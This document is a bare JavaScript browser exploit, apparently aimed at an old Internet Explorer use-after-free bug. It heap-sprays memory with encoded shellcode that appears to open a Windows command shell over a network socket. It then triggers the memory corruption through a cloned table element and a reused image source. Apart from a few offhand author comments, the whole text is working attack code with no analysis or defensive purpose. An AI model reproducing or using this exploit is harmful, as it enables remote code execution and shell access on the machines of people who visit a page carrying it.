if(navigator.userAgent.match(REGEXP)) {
	var shellcode=unescape("%u4343%u4343%u43eb%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b%u0120%u31ea%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf%u01ac%u85c7%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c%u6850%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe%uff90%uffff%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0%u40c4%ubb50%u7d22%u7dab%u75e8%uffff%u31ff%u50c0%u5050%u4050%u4050%ubb50%u55a6%u7934%u61e8%uffff%u89ff%u31c6%u50c0%u3550%u0102%ucc70%uccfe%u8950%u50e0%u106a%u5650%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650%ud3bb%u58fa%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56%uf347%uc656%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353%u5353%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353%u5343%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe%u5bff%uc031%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff%uef87%u12bb%u6d6b%ue8d0%ufec2%uffff%uc483%u615c%u89eb");
	
	var array = new Array();
	
	//Don't need change but for execute time you can change ;)
	
	var calc = 0x100000-(shellcode.length*2+0x01020);
	
	// Spray or Not :-??
	
	var point = unescape("%u0D0D%u0D0D");
	while(point.length<calc) { point+=point;}
	var sec = point.substring(0,calc/2);
	delete point;
	
	for(i=0; i<0xD0; i++) {
	array[i] = sec + shellcode;
	}
	
	// N/A Code 
	
	CollectGarbage();
	
	var s1=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
	var a1 = new Array();
	for(var x=0;x<500;x++) a1.push(document.createElement("img"));
	o1=document.createElement("tbody");
	o1.click;
	var o2 = o1.cloneNode();
	o1.clearAttributes();
	o1=null; CollectGarbage();
	for(var x=0;x<a1.length;x++) a1[x].src=s1;
	o2.click;
}